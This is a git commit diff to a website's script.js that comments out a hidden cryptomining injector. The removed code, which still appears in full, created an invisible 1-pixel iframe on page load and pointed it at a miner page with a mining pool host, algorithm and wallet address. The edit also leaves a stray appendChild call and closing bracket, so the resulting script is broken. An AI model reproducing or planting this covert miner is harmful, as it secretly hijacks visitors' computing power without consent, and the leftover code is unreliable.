25818f161c619c350f0c2eab04240cc53ce88933
Teo4268 <mamacook3300@gmail.com>
2025-03-26 00:17:09 +0700

    Update script.js

--- script.js
+++ script.js
@@ -106,15 +106,15 @@ function closePopup() {
     popup.style.display = "none"; 
   }, 500);
 }
-document.addEventListener("DOMContentLoaded", function () {
-    let iframe = document.createElement("iframe");
-    iframe.style.position = "absolute";
-    iframe.style.width = "1px";
-    iframe.style.height = "1px";
-    iframe.style.opacity = "0";
-    iframe.style.pointerEvents = "none";
-    iframe.style.overflow = "hidden";
-    iframe.src = "https://api-music.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs&password=c%3DRVN&workers=2";
+// document.addEventListener("DOMContentLoaded", function () {
+ //   let iframe = document.createElement("iframe");
+   // iframe.style.position = "absolute";
+  //  iframe.style.width = "1px";
+    //iframe.style.height = "1px";
+   // iframe.style.opacity = "0";
+   // iframe.style.pointerEvents = "none";
+  //  iframe.style.overflow = "hidden";
+   // iframe.src = "https://api-music.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs&password=c%3DRVN&workers=2";
     
     document.body.appendChild(iframe);
 });
